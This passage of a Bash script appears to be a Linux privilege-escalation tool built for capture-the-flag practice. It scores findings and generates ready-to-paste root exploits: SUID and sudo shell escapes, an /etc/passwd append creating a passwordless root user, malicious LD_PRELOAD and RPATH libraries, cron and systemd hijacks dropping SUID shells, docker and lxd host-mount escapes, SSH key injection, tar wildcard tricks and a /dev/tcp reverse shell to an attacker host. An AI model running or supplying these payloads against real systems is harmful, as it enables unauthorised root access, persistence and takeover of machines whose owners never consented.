    # Programs whose wildcard arg lets attacker plant a file named "--option"
    # that gets interpreted as a flag → command injection.
    local conf=0
    local vector=""
    case "$prog" in
        tar)
            case "$cmd" in
                *' *'*|*'/*'*)
                    case "$cmd" in
                        *--*) ;;                                # already an option blob; skip
                        *' c'*|*' x'*|*'czf'*|*'xzf'*|*'cf'*|*'xf'*)
                            conf=92
                            vector="tar wildcard → --checkpoint-action=exec"
                            ;;
                    esac
                    ;;
            esac
            ;;
        rsync)
            case "$cmd" in
                *' *'*|*'/*'*)
                    conf=90
                    vector="rsync wildcard → -e injection"
                    ;;
            esac
            ;;
        chown|chmod|chgrp)
            case "$cmd" in
                *' *'*|*'/*'*)
                    conf=85
                    vector="$prog wildcard → --reference= file injection"
                    ;;
            esac
            ;;
        zip|7z|7za)
            case "$cmd" in
                *' *'*|*'/*'*)
                    conf=82
                    vector="$prog wildcard → -T --unzip-command injection"
                    ;;
            esac
            ;;
    esac

    if [ "$conf" -gt 0 ]; then
        register_finding "DEEP_WILDCARD_INJECTION" "$source_file" \
            "Wildcard injection ($context): $vector  CMD: $(printf '%s' "$cmd" | head -c 100)" \
            "$conf" "deep_wildcard"
    fi
    return 0
}


# =============================================================================
# SECTION 7 — Engine 3: Reasoner (Score, Rank, Generate Exploits)
# =============================================================================
# All findings are structured records (Engine 3 receives data, not strings).
# Multi-lens confirmation boosts confidence. Confidence ALWAYS clamped to 1..99.

register_finding() {
    # CRITICAL-2: unique-per-finding file + atomic mv rename.
    # Args: type path desc confidence lens
    local type="${1:-UNKNOWN}"
    local path="${2:-}"
    local desc="${3:-}"
    local confidence="${4:-50}"
    local lens="${5:-generic}"

    [ -n "$APEX_FINDINGS_DIR" ] || return 0
    [ -d "$APEX_FINDINGS_DIR" ] || return 0

    # Clamp confidence to 1..99 (per the engine spec — never 0, never 100).
    case "$confidence" in
        ''|*[!0-9]*) confidence=50 ;;
    esac
    [ "$confidence" -lt 1 ]  && confidence=1
    [ "$confidence" -gt 99 ] && confidence=99

    # Sanitize all fields — strip any embedded newline / pipe / control chars
    # so the finding record stays parseable. HIGH-7.
    type=$(printf '%s' "$type"           | tr -d '\n\r|' | tr -cd '[:print:]\t')
    path=$(printf '%s' "$path"           | tr -d '\n\r|' | tr -cd '[:print:]\t')
    desc=$(printf '%s' "$desc"           | tr -d '\n\r|' | tr -cd '[:print:]\t')
    lens=$(printf '%s' "$lens"           | tr -d '\n\r|' | tr -cd '[:print:]\t')

    # Unique filename: lens + nanoseconds + pid + random — collision-free
    # across parallel mappers writing simultaneously.
    local stamp rnd id finding_file
    stamp=$(date +%s%N 2>/dev/null)
    case "$stamp" in
        ''|*N*) stamp="$(date +%s)$$" ;;
    esac
    rnd="${RANDOM:-0}${RANDOM:-0}"
    id="${lens}_${stamp}_${rnd}"

    finding_file="${APEX_FINDINGS_DIR}/${id}.finding"
    printf '%s|%s|%s|%d|%s\n' \
        "$type" "$path" "$desc" "$confidence" "$lens" \
        > "${finding_file}.tmp" 2>/dev/null || return 0
    mv "${finding_file}.tmp" "$finding_file" 2>/dev/null
    return 0
}

register_exploit() {
    # Sister file to register_finding — stores the actual exploit command.
    # Args: type path exploit_command
    local type="${1:-UNKNOWN}"
    local path="${2:-}"
    local exploit="${3:-}"

    [ -n "$APEX_FINDINGS_DIR" ] || return 0
    [ -d "$APEX_FINDINGS_DIR" ] || return 0

    type=$(printf '%s' "$type"       | tr -d '\n\r|' | tr -cd '[:print:]\t')
    path=$(printf '%s' "$path"       | tr -d '\n\r|' | tr -cd '[:print:]\t')
    # Replace embedded newlines with '; ' so multi-line exploits remain runnable
    # on one shell line (instead of "PATH=/tmpprintf..." collapse bug).
    exploit=$(printf '%s' "$exploit" | tr '\n' '\036' | sed 's/\o36\+/; /g' | tr -d '\r' | tr -cd '[:print:]\t; ')

    local stamp rnd id exploit_file
    stamp=$(date +%s%N 2>/dev/null); case "$stamp" in ''|*N*) stamp="$(date +%s)$$" ;; esac
    rnd="${RANDOM:-0}${RANDOM:-0}"
    id="exploit_${stamp}_${rnd}"
    exploit_file="${APEX_FINDINGS_DIR}/${id}.exploit"
    printf '%s|%s|%s\n' "$type" "$path" "$exploit" \
        > "${exploit_file}.tmp" 2>/dev/null || return 0
    mv "${exploit_file}.tmp" "$exploit_file" 2>/dev/null
    return 0
}

collect_findings() {
    [ -n "$APEX_FINDINGS_DIR" ] || return 0
    [ -d "$APEX_FINDINGS_DIR" ] || return 0
    local f
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        cat "$f" 2>/dev/null
    done
    return 0
}
apply_confidence_modifiers() {
    # Combine a base score with any number of signed modifiers and return the
    # final integer in the range 1..99. ALL modifiers must pass through here —
    # never compute confidence inline with $((base+bonus)). HIGH guarantee:
    # no input — invalid, empty, negative, decimal, alphabetic — can produce
    # output outside 1..99.
    #
    # Args:  base  [mod1 mod2 ...]
    # Echo:  clamped integer
    local base="${1:-50}"
    shift 2>/dev/null || true

    # Sanitize base
    case "$base" in
        ''|*[!0-9-]*) base=50 ;;
    esac
    case "$base" in
        -*)
            local rest="${base#-}"
            case "$rest" in
                ''|*[!0-9]*) base=50 ;;
            esac
            ;;
    esac

    local total="$base"
    local m
    for m in "$@"; do
        case "$m" in
            ''|+|-) continue ;;
            -*)
                local mr="${m#-}"
                case "$mr" in
                    ''|*[!0-9]*) continue ;;
                esac
                total=$(( total - mr ))
                ;;
            +*)
                local mp="${m#+}"
                case "$mp" in
                    ''|*[!0-9]*) continue ;;
                esac
                total=$(( total + mp ))
                ;;
            *[!0-9]*) continue ;;
            *)
                total=$(( total + m ))
                ;;
        esac
    done

    # Clamp 1..99 — never 0, never 100. NO EXCEPTIONS.
    [ "$total" -lt 1  ] && total=1
    [ "$total" -gt 99 ] && total=99
    printf '%d\n' "$total"
    return 0
}
correlate_lateral_pivots() {
    # Cross-engine correlation: if a FOREIGN_FILE_IN_WRITABLE_DIR or PSPY_DIR_HIJACK
    # finding shares a path or parent directory with a CRON_* finding, they describe
    # the same lateral pivot — emit a unified LATERAL_CRON_WRITABLE_HOME finding at 90%.
    [ -n "$APEX_FINDINGS_DIR" ] && [ -d "$APEX_FINDINGS_DIR" ] || return 0

    local _ff _ffile _fdir _cf _cpath _cdir

    for _ff in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$_ff" ] || continue
        # Check if this finding is a writable-dir or pspy-dir-hijack type
        local _ftype
        _ftype=$(awk -F'|' 'NR==1{print $1}' "$_ff" 2>/dev/null)
        case "$_ftype" in
            FOREIGN_FILE_IN_WRITABLE_DIR|PSPY_DIR_HIJACK|PSPY_DIR_HIJACK_ROOT) ;;
            *) continue ;;
        esac
        _ffile=$(awk -F'|' 'NR==1{print $2}' "$_ff" 2>/dev/null)
        _fdir=$(dirname -- "$_ffile" 2>/dev/null)

        # Search for any cron finding that references the same file or directory
        for _cf in "$APEX_FINDINGS_DIR"/*.finding; do
            [ -f "$_cf" ] || continue
            [ "$_cf" = "$_ff" ] && continue
            local _ctype
            _ctype=$(awk -F'|' 'NR==1{print $1}' "$_cf" 2>/dev/null)
            case "$_ctype" in CRON_*|PSPY_CRON*|FOREIGN_FILE*) ;; *) continue ;; esac
            _cpath=$(awk -F'|' 'NR==1{print $2}' "$_cf" 2>/dev/null)
            _cdir=$(dirname -- "$_cpath" 2>/dev/null)

            # Match if same file, same dir, or one is parent of the other
            local _match=0
            [ "$_ffile" = "$_cpath" ] && _match=1
            [ "$_fdir"  = "$_cdir"  ] && _match=1
            [ "$_fdir"  = "$_cpath" ] && _match=1
            [ "$_ffile" = "$_cdir"  ] && _match=1
            [ "$_match" = "0" ] && continue

            # Identify target user from the foreign file's owner
            local _target_user
            _target_user=$(stat -c '%U' "$_ffile" 2>/dev/null)
            [ -z "$_target_user" ] && _target_user="unknown"

            local _exploit_wait="60"
            case "$_ctype" in CRON_*) _exploit_wait="65" ;; esac

            register_finding "LATERAL_CRON_WRITABLE_HOME" "$_ffile" \
                "LATERAL PIVOT → $_target_user: cron runs $_cpath from YOUR writable dir $_fdir — delete+recreate to hijack" \
                90 "lateral"
            register_exploit "LATERAL_CRON_WRITABLE_HOME" "$_ffile" \
                "rm -f $_ffile; printf '#!/bin/bash -p\nmkdir -p \$HOME/.ssh; cp ~/.ssh/id_rsa.pub \$HOME/.ssh/authorized_keys 2>/dev/null; cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' > $_ffile; chmod +x $_ffile; sleep ${_exploit_wait}; ssh $_target_user@localhost OR ${APEX_EXEC_DIR:-/tmp}/rootbash -p"
            # Only register once per foreign file, avoid duplicate per cron match
            break
        done
    done
    return 0
}

build_confirmed_chains() {
    # Read every *.finding file. Group by (vector_family|path). When the same
    # target was confirmed by two or more independent lenses (deep_shell +
    # deep_unit, mapper_cron + deep_cron, etc.) bump confidence — but always
    # through apply_confidence_modifiers so the 1..99 clamp holds.
    #
    # Writes a sorted chain file to $APEX_FINDINGS_DIR/chains.sorted with one
    # record per line:
    #   CONF|FAMILY|PATH|LENSES_CSV|TYPES_CSV|FIRST_DESC
    # Echoes the same to stdout for callers that want it streamed.
    [ -n "$APEX_FINDINGS_DIR" ] || return 0
    [ -d "$APEX_FINDINGS_DIR" ] || return 0

    local raw="${APEX_FINDINGS_DIR}/.chains_raw.tmp"
    local agg="${APEX_FINDINGS_DIR}/.chains_agg.tmp"
    local out="${APEX_FINDINGS_DIR}/chains.sorted"
    : > "$raw"

    local f
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        # Use first 5 fields only (desc may contain spaces but no pipes — sanitized).
        local rec type path desc conf lens family
        rec=$(head -1 "$f" 2>/dev/null)
        [ -z "$rec" ] && continue
        type=$(printf '%s' "$rec" | awk -F'|' '{print $1}')
        path=$(printf '%s' "$rec" | awk -F'|' '{print $2}')
        desc=$(printf '%s' "$rec" | awk -F'|' '{print $3}')
        conf=$(printf '%s' "$rec" | awk -F'|' '{print $4}')
        lens=$(printf '%s' "$rec" | awk -F'|' '{print $5}')
        # Sanitize numeric
        case "$conf" in ''|*[!0-9]*) conf=50 ;; esac

        # Family = first underscore-segment after stripping DEEP_/MAPPER_ prefix.
        # SUID, SUDO, CRON, AUTHKEYS, GROUP, PROCESS, SSH, CRED, etc.
        family=$(printf '%s' "$type" \
                 | sed -E 's/^(DEEP|MAPPER|SCAN|CRED|CHECK)_//' \
                 | awk -F'_' '{print $1}')
        [ -z "$family" ] && family="MISC"

        printf '%s\t%s\t%d\t%s\t%s\t%s\n' \
            "$family" "$path" "$conf" "$lens" "$type" "$desc" >> "$raw"
    done

    [ -s "$raw" ] || { rm -f "$raw"; return 0; }

    # Group by (family, path). For each group: max confidence + lens-diversity bonus.
    sort -k1,1 -k2,2 -t$'\t' "$raw" \
        | awk -F'\t' '
            function flush(   bonus, lens_count, t_count, conf, lcsv, tcsv, kk) {
                if (key == "") return
                # Count distinct lenses and types (use local kk — outer awk uses k)
                lens_count = 0; for (kk in lens_set) lens_count++
                t_count    = 0; for (kk in type_set) t_count++
                # Build CSVs
                lcsv = ""; for (kk in lens_set) { lcsv = (lcsv=="" ? kk : lcsv "," kk) }
                tcsv = ""; for (kk in type_set) { tcsv = (tcsv=="" ? kk : tcsv "," kk) }
                # Bonus: +8 per additional lens, +5 per additional type. Negative means none.
                bonus = (lens_count - 1) * 8 + (t_count - 1) * 5
                printf "%s\t%s\t%d\t%d\t%s\t%s\t%s\n", family, path, max_conf, bonus, lcsv, tcsv, first_desc
            }
            {
                fam=$1; pth=$2; cf=$3+0; ln=$4; tp=$5; ds=$6
                k = fam "|" pth
                if (k != key) {
                    flush()
                    key=k; family=fam; path=pth
                    max_conf=cf
                    delete lens_set; delete type_set
                    first_desc=ds
                }
                if (cf > max_conf) max_conf=cf
                lens_set[ln]=1
                type_set[tp]=1
            }
            END { flush() }
        ' > "$agg"

    # Apply clamped bonus via apply_confidence_modifiers, then sort descending.
    : > "${out}.tmp"
    while IFS=$'\t' read -r family path base_conf bonus lcsv tcsv fdesc; do
        [ -z "$family" ] && continue
        local final
        final=$(apply_confidence_modifiers "$base_conf" "$bonus")
        printf '%s|%s|%s|%s|%s|%s\n' \
            "$final" "$family" "$path" "$lcsv" "$tcsv" "$fdesc" >> "${out}.tmp"
    done < "$agg"

    sort -t'|' -k1,1nr "${out}.tmp" > "$out" 2>/dev/null
    rm -f "$raw" "$agg" "${out}.tmp"
    cat "$out" 2>/dev/null
    return 0
}
_get_stored_exploit() {
    # Look up stored exploit text from register_exploit() .exploit files.
    # Searches for type+path match first; type-only match as fallback.
    # Args: type path
    # Returns the exploit string or empty.
    local type="${1:-}" path="${2:-}"
    [ -n "$APEX_FINDINGS_DIR" ] && [ -d "$APEX_FINDINGS_DIR" ] || return 0
    local f rec etype epath exploit
    # Exact match: type AND path
    for f in "$APEX_FINDINGS_DIR"/*.exploit; do
        [ -f "$f" ] || continue
        rec=$(head -1 "$f" 2>/dev/null)
        etype=$(printf '%s' "$rec" | cut -d'|' -f1)
        epath=$(printf '%s' "$rec" | cut -d'|' -f2)
        exploit=$(printf '%s' "$rec" | cut -d'|' -f3-)
        if [ "$etype" = "$type" ] && [ "$epath" = "$path" ] && [ -n "$exploit" ]; then
            printf '%s' "$exploit"
            return 0
        fi
    done
    # Type-only match (e.g. GROUP_TMUX_HIJACK where path is group name)
    for f in "$APEX_FINDINGS_DIR"/*.exploit; do
        [ -f "$f" ] || continue
        rec=$(head -1 "$f" 2>/dev/null)
        etype=$(printf '%s' "$rec" | cut -d'|' -f1)
        exploit=$(printf '%s' "$rec" | cut -d'|' -f3-)
        if [ "$etype" = "$type" ] && [ -n "$exploit" ]; then
            printf '%s' "$exploit"
            return 0
        fi
    done
    return 0
}

generate_exploit_command() {
    # Produce a copy-pasteable command for the given finding type. Adapts to:
    #   - EXEC_DIR    : first writable+exec directory found in Phase 2
    #   - EXEC_METHOD : binary/python/perl/in-memory primitive available
    # Args: type path [extra]
    # Echoes one or more lines (each runnable on its own).
    local type="${1:-}"
    local path="${2:-}"
    local extra="${3:-}"
    [ -z "$type" ] && return 0

    local dir="${APEX_EXEC_DIR:-${EXEC_DIR:-/tmp}}"
    local sh="/bin/sh"
    [ "${HAS_BASH:-0}" = "1" ] && sh="/bin/bash"

    case "$type" in
        # ── SUID binary classes ──────────────────────────────────────────────
        SUID_BASH|MAPPER_SUID_BASH)
            printf '%s -p\n' "$path"
            ;;
        SUID_FIND|MAPPER_SUID_FIND)
            printf '%s . -exec %s -p \\; -quit\n' "$path" "$sh"
            ;;
        SUID_VIM|MAPPER_SUID_VIM)
            printf '%s -c ":set shell=%s" -c ":shell"\n' "$path" "$sh"
            ;;
        SUID_NMAP|MAPPER_SUID_NMAP)
            printf '%s --interactive\n!sh\n' "$path"
            ;;
        SUID_PYTHON*|MAPPER_SUID_PYTHON*)
            printf '%s -c '\''import os; os.setuid(0); os.execl("%s","sh")'\''\n' \
                "$path" "$sh"
            ;;
        SUID_PERL|MAPPER_SUID_PERL)
            printf '%s -e '\''exec "%s";'\''\n' "$path" "$sh"
            ;;
        SUID_CP|MAPPER_SUID_CP)
            printf '# Overwrite /etc/passwd with appended root-equivalent line\n'
            printf 'echo '\''toor::0:0:root:/root:%s'\'' >> /tmp/p\n' "$sh"
            printf '%s --no-preserve=mode,ownership /tmp/p /etc/passwd\n' "$path"
            printf 'su toor\n'
            ;;
        DEEP_SUID_RPATH_WRITABLE)
            printf '# Plant malicious .so in writable RPATH dir, then run SUID binary.\n'
            printf 'cat > %s/evil.c <<EOF\n' "$dir"
            printf '#include <unistd.h>\nstatic void __attribute__((constructor)) e(){setuid(0);execl("%s","sh",NULL);}\nEOF\n' "$sh"
            printf 'gcc -shared -fPIC -o %s/libevil.so %s/evil.c && cp %s/libevil.so %s && %s\n' \
                "$dir" "$dir" "$dir" "$extra" "$path"
            ;;
        SUID_CUSTOM|MAPPER_SUID_CUSTOM)
            printf '# Investigate — check for PATH-relative calls or writable library dirs\n'
            printf 'strings %s | grep -v "^/" | grep -E "^[a-zA-Z][a-zA-Z0-9_-]*$"  # PATH hijack candidates\n' "$path"
            printf 'strace -e trace=execve,open,openat %s 2>&1 | head -40  # live call trace\n' "$path"
            printf 'ltrace -e system %s 2>&1 | head -20  # library call trace\n' "$path"
            ;;

        # ── sudo (NOPASSWD) ──────────────────────────────────────────────────
        SUDO_NOPASSWD|MAPPER_SUDO_NOPASSWD)
            printf 'sudo -n %s\n' "$path"
            ;;
        SUDO_NOPASSWD_PYTHON|MAPPER_SUDO_NOPASSWD_PYTHON)
            printf 'sudo -n %s -c '\''import os; os.execl("%s","sh")'\''\n' "$path" "$sh"
            ;;
        SUDO_NOPASSWD_VIM|MAPPER_SUDO_NOPASSWD_VIM)
            printf 'sudo -n %s -c ":set shell=%s" -c ":shell"\n' "$path" "$sh"
            ;;
        SUDO_LD_PRELOAD|MAPPER_SUDO_ENV_KEEP_LD)
            printf 'cat > %s/p.c <<EOF\n' "$dir"
            printf 'void __attribute__((constructor)) e(){setuid(0);system("%s");}\nEOF\n' "$sh"
            printf 'gcc -fPIC -shared -nostartfiles -o %s/p.so %s/p.c\n' "$dir" "$dir"
            printf 'sudo -n LD_PRELOAD=%s/p.so %s\n' "$dir" "$path"
            ;;

        # ── Groups ───────────────────────────────────────────────────────────
        GROUP_DOCKER|MAPPER_GROUP_DOCKER)
            printf 'docker run -v /:/mnt --rm -it alpine chroot /mnt %s\n' "$sh"
            ;;
        GROUP_LXD|MAPPER_GROUP_LXD|GROUP_LXC|MAPPER_GROUP_LXC)
            printf 'lxc image import alpine.tar.gz --alias evil\n'
            printf 'lxc init evil c -c security.privileged=true\n'
            printf 'lxc config device add c host disk source=/ path=/mnt/host recursive=true\n'
            printf 'lxc start c && lxc exec c -- chroot /mnt/host %s\n' "$sh"
            ;;
        GROUP_DISK|MAPPER_GROUP_DISK)
            printf 'debugfs -w /dev/sda1   # then: cd /root ; cat .ssh/id_rsa\n'
            ;;
        GROUP_SHADOW|MAPPER_GROUP_SHADOW)
            printf 'cat /etc/shadow   # crack offline with hashcat/john\n'
            ;;

        # ── SSH credential / authorized_keys ─────────────────────────────────
        AUTHKEYS_*|MAPPER_AUTHKEYS_*|CHECK_AUTHKEYS_INJECTABLE)
            printf 'ssh-keygen -t ed25519 -N "" -f %s/k\n' "$dir"
            # path may be the .ssh dir itself (AUTHKEYS_DIR_*) or the authorized_keys file.
            case "$path" in
                */authorized_keys) printf 'cat %s/k.pub >> %s\n' "$dir" "$path" ;;
                *)                 printf 'mkdir -p %s && cat %s/k.pub >> %s/authorized_keys && chmod 600 %s/authorized_keys\n' \
                                       "$path" "$dir" "$path" "$path" ;;
            esac
            printf 'ssh -i %s/k <user>@localhost\n' "$dir"
            ;;
        SSH_KEY_CLEAR|SCAN_SSH_KEY_CLEAR)
            printf 'chmod 600 %s && ssh -i %s <user>@<host>\n' "$path" "$path"
            ;;

        # ── Cron classes ─────────────────────────────────────────────────────
        CRON_WRITABLE|MAPPER_CRON_WRITABLE|DEEP_CRON_CMD_WRITABLE)
            printf '# Append root-shell payload to the cron-driven script:\n'
            printf 'printf '\''\\ncp %s %s/rs && chmod 4755 %s/rs\\n'\'' >> %s\n' \
                "$sh" "$dir" "$dir" "$path"
            printf '# Wait for cron tick, then run: %s/rs -p\n' "$dir"
            ;;
        CRON_PATH_HIJACK|MAPPER_CRON_PATH_HIJACK|DEEP_CRON_PATH_WRITABLE|DEEP_CRON_JOB_PATH_WRITABLE)
            printf '# Plant a fake binary in the writable PATH dir:\n'
            printf 'cat > %s/<cmdname> <<EOF\n#!%s\ncp %s %s/rs && chmod 4755 %s/rs\nEOF\nchmod +x %s/<cmdname>\n' \
                "$path" "$sh" "$sh" "$dir" "$dir" "$path"
            ;;

        # ── Systemd unit ─────────────────────────────────────────────────────
        DEEP_UNIT_EXEC_WRITABLE|MAPPER_UNIT_EXEC_WRITABLE)
            printf '# Replace unit-invoked binary with a payload, then restart unit:\n'
            printf 'cat > %s <<EOF\n#!%s\ncp %s %s/rs && chmod 4755 %s/rs\nEOF\nchmod +x %s\n' \
                "$path" "$sh" "$sh" "$dir" "$dir" "$path"
            printf 'systemctl restart <unit>   # or wait for next trigger\n'
            ;;
        DEEP_UNIT_ENVFILE_WRITABLE|MAPPER_UNIT_ENVFILE_WRITABLE)
            printf '# Inject LD_PRELOAD into the unit EnvironmentFile:\n'
            printf 'cat > %s/p.c <<EOF\n#include <unistd.h>\nstatic void __attribute__((constructor)) e(){setuid(0);execl("%s","sh",NULL);}\nEOF\n' \
                "$dir" "$sh"
            printf 'gcc -shared -fPIC -nostartfiles -o %s/p.so %s/p.c\n' "$dir" "$dir"
            printf 'echo '\''LD_PRELOAD=%s/p.so'\'' >> %s\n' "$dir" "$path"
            printf 'systemctl restart <unit>\n'
            ;;

        # ── Wildcard injection ───────────────────────────────────────────────
        DEEP_WILDCARD_INJECTION)
            printf '# Plant trigger files in the wildcard target directory:\n'
            printf 'cd <dir-being-globbed>\n'
            printf 'echo '\''cp %s %s/rs && chmod 4755 %s/rs'\'' > .shell.sh && chmod +x .shell.sh\n' \
                "$sh" "$dir" "$dir"
            printf 'touch -- --checkpoint=1\n'
            printf 'touch -- --checkpoint-action=exec=sh\\ .shell.sh\n'
            printf '# Wait for cron / unit / script to run tar with `*`\n'
            ;;

        # ── Writable critical files ──────────────────────────────────────────
        PASSWD_WRITABLE|MAPPER_PASSWD_WRITABLE)
            printf 'echo '\''toor::0:0:root:/root:%s'\'' >> /etc/passwd && su toor\n' "$sh"
            ;;
        SHADOW_WRITABLE|MAPPER_SHADOW_WRITABLE)
            printf '# Generate a known-password hash and replace the root shadow line:\n'
            printf 'openssl passwd -1 -salt salt password\n'
            ;;
        SUDOERS_WRITABLE|MAPPER_SUDOERS_WRITABLE)
            printf 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> %s && sudo -n %s\n' \
                "$path" "$sh"
            ;;

        # ── Loader / library ─────────────────────────────────────────────────
        DEEP_LD_LIBDIR_WRITABLE|DEEP_LD_CONFD_WRITABLE|DEEP_LD_CONF_WRITABLE)
            printf '# Plant a malicious .so in the loader-searched dir:\n'
            printf 'gcc -shared -fPIC -nostartfiles -o %s/libc.so.6 <(echo '\''void __attribute__((constructor)) e(){setuid(0);system("%s");}'\'')\n' \
                "$path" "$sh"
            ;;

        # ── NFS ──────────────────────────────────────────────────────────────
        NFS_NO_ROOT_SQUASH|MAPPER_NFS_NO_ROOT_SQUASH)
            printf '# From a host where you have root: mount and plant SUID binary:\n'
            printf 'mount -o vers=3 <target>:%s /mnt/nfs && cp %s /mnt/nfs/.rs && chmod 4755 /mnt/nfs/.rs\n' \
                "$path" "$sh"
            ;;

        # ── Tmux / Screen session hijacking ─────────────────────────────────
        GROUP_TMUX_HIJACK)
            printf '# Find accessible tmux sockets, attach to live session:\n'
            printf 'find /tmp /run -name "tmux-*" -readable 2>/dev/null\n'
            printf 'tmux -S <socket_path> attach\n'
            printf '# Or list all sessions: tmux -S <socket_path> list-sessions\n'
            ;;
        TMUX_SOCKET_HIJACK)
            printf 'tmux -S %s list-sessions 2>/dev/null\n' "$path"
            printf 'tmux -S %s attach\n' "$path"
            ;;
        SCREEN_SOCKET_HIJACK)
            printf 'screen -x %s\n' "$(basename "$(dirname "$path")" | sed 's/S-//')"
            ;;

        # ── Unix socket lateral pivot ────────────────────────────────────────
        UNIX_SOCK_LATERAL|HISTORY_UNIX_SOCKET_EXISTS)
            printf 'socat stdio unix-connect:%s\n' "$path"
            printf '# Or: nc -U %s\n' "$path"
            ;;
        UNIX_SOCK_DOCKER)
            printf 'docker -H unix://%s run -v /:/mnt --rm -it alpine chroot /mnt sh\n' "$path"
            ;;

        # ── CAP_SYS_ADMIN (non-snap) ─────────────────────────────────────────
        CAP_SYS_ADMIN)
            printf 'getcap %s 2>/dev/null\n' "$path"
            # If description mentions cap_setuid, give setuid(0) path
            case "$extra" in
                *cap_setuid*)
                    printf '%s -c '\''import os; os.setuid(0); os.execl("%s","sh")'\''\n' \
                        "$path" "$sh"
                    ;;
                *python*|*.py)
                    printf '%s -c '\''import os; os.setuid(0); os.execl("%s","sh")'\''\n' \
                        "$path" "$sh"
                    ;;
                *)
                    printf '# Attempt namespace / mount escape via CAP_SYS_ADMIN:\n'
                    printf 'unshare -m %s -c "mount -t tmpfs none /tmp && %s"\n' "$sh" "$sh"
                    ;;
            esac
            ;;

        # ── User dotfile injection ───────────────────────────────────────────
        WRITE_USER_DOTFILE|WRITE_ROOT_DOTFILE)
            printf 'echo '\''bash -i >& /dev/tcp/<attacker>/<port> 0>&1'\'' >> %s\n' "$path"
            printf '# Wait for target user to log in / source the file\n'
            ;;

        # ── Generic / fallback ───────────────────────────────────────────────
        *)
            printf '# No automated exploit template for %s — see finding details.\n' "$type"
            ;;
    esac
    return 0
}
trap_warning_lookup() {
    # Per-vector warning text drawn from 08_OUTPUT_AND_RANKING.md.
    # Args: vector_type
    # Echoes a multi-line warning, or nothing if no template exists.
    local type="${1:-}"
    [ -z "$type" ] && return 0

    case "$type" in
        SUDO_NOPASSWD_PYTHON|MAPPER_SUDO_NOPASSWD_PYTHON)
            cat <<'EOF'
  Common fail: env_reset wipes your LD_PRELOAD/PYTHONPATH
  Check:       sudo -n -l | grep env_keep
  If env_keep includes PYTHONPATH: use that instead of LD_PRELOAD
  Rabbit hole: sudo on /usr/bin/python2 but machine only has python3
EOF
            ;;
        SUDO_NOPASSWD_VIM|MAPPER_SUDO_NOPASSWD_VIM)
            cat <<'EOF'
  Common fail: vim-tiny or patched version — :!/bin/bash may fail
  Check:       vim --version | grep '+python\|tiny'
  Green flag:  full vim with +python3 support
  Fallback:    vim -c ':set shell=/bin/bash' -c ':shell'
EOF
            ;;
        SUID_CUSTOM|MAPPER_SUID_CUSTOM|SUID_CUSTOM_BINARY)
            cat <<'EOF'
  Common fail: strings shows it calls system() but binary is patched
  Check:       ltrace ./binary  or  strace ./binary 2>&1 | head -20
  Rabbit hole: binary exists but dumps core every time
  Green flag:  binary runs and calls identifiable command
EOF
            ;;
        CRON_WRITABLE|MAPPER_CRON_WRITABLE|CRON_WRITABLE_SCRIPT|DEEP_CRON_CMD_WRITABLE)
            cat <<'EOF'
  Common fail: script not writable but directory is — can REPLACE it
  Watch:       cron may run as www-data not root — check field 6 in crontab
  Rabbit hole: /tmp has noexec — cannot execute shell there
  Green flag:  writable dir, root in field 6, exec mount
EOF
            ;;
        CRON_PATH_HIJACK|MAPPER_CRON_PATH_HIJACK|DEEP_CRON_PATH_WRITABLE|DEEP_CRON_JOB_PATH_WRITABLE)
            cat <<'EOF'
  Most missed: PATH= line at TOP of /etc/crontab, not the command
  Students focus on what is called, miss what PATH is set to
  Check:       grep '^PATH=' /etc/crontab
  Green flag:  writable PATH dir AND command lacks a full path
EOF
            ;;
        GROUP_DOCKER|MAPPER_GROUP_DOCKER|DOCKER_GROUP)
            cat <<'EOF'
  Common fail: docker group but daemon not running
  Check:       docker info >/dev/null 2>&1 && echo RUNNING
  Watch:       docker ps may fail even with running daemon (socket perms)
  Green flag:  docker info succeeds AND /var/run/docker.sock writable
EOF
            ;;
        GROUP_LXD|MAPPER_GROUP_LXD|GROUP_LXC|MAPPER_GROUP_LXC|LXD_GROUP)
            cat <<'EOF'
  Different from docker — requires lxd initialization
  Trap:        student tries docker exploit → wrong technique entirely
  Check:       id | grep lxd  (not docker)
  Technique:   import alpine image, mount /, chroot
EOF
            ;;
        KERNEL_CVE|MAPPER_KERNEL_CVE)
            cat <<'EOF'
  Biggest waste in CTF: version looks vulnerable but is patched
  Common:      Ubuntu 16.04 with DirtyCow version but patch applied
  Check:       dmesg | grep -i dirty ; cat /proc/version_signature
  Green flag:  old kernel + no patch indication + gcc available
  Rabbit hole: version matches but it is a CTF — they usually patch obvious CVEs
EOF
            ;;
        CRED_PLANTED|CREDENTIAL_PLANTED|SCAN_CRED_PLANTED)
            cat <<'EOF'
  Some CTF makers plant fake credentials to waste time
  Test mutations of the found password on all services within 5 minutes
  If nothing works within 5 minutes → mark as low confidence, move on
  Signal:      password found in obvious place, works on nothing
EOF
            ;;
        DEEP_UNIT_ENVFILE_WRITABLE|MAPPER_UNIT_ENVFILE_WRITABLE|WRITABLE_ENV_FILE)
            cat <<'EOF'
  EnvironmentFile writable → inject LD_PRELOAD or PYTHONPATH
  But:         service must restart to pick up new env
  Watch:       AppArmor may prevent LD_PRELOAD
  Check:       systemctl show <service> | grep Restart
  Green flag:  Restart=always or on-failure with short timer
EOF
            ;;
        AUTHKEYS_*|MAPPER_AUTHKEYS_*|CHECK_AUTHKEYS_INJECTABLE)
            cat <<'EOF'
  Common fail: authorized_keys writable but sshd disabled / port closed
  Check:       ss -ltn | grep :22 ; systemctl is-active ssh sshd
  Watch:       AuthorizedKeysFile may not be the default — check sshd_config
  Green flag:  sshd active, default key path, no PasswordAuthentication required
EOF
            ;;
        DEEP_WILDCARD_INJECTION)
            cat <<'EOF'
  Works only when the command runs IN the directory containing the glob
  Check:       does the script cd <dir> before the wildcard call?
  Watch:       --checkpoint-action variant differs across tar versions
  Green flag:  tar/rsync invoked with bare * and writable target dir
EOF
            ;;
        *)
            return 0
            ;;
    esac
    return 0
}
predict_lateral_path() {
    # Suggest a pivot when the current user cannot go straight to root, but
    # the findings hint at another local account that can. Reads the sorted
    # chains file (preferred) or the raw findings dir, then prints zero or
    # more pivot recommendations to stdout.
    [ -n "$APEX_FINDINGS_DIR" ] || return 0
    [ -d "$APEX_FINDINGS_DIR" ] || return 0

    local me
    me="${APEX_USER:-$(whoami 2>/dev/null)}"
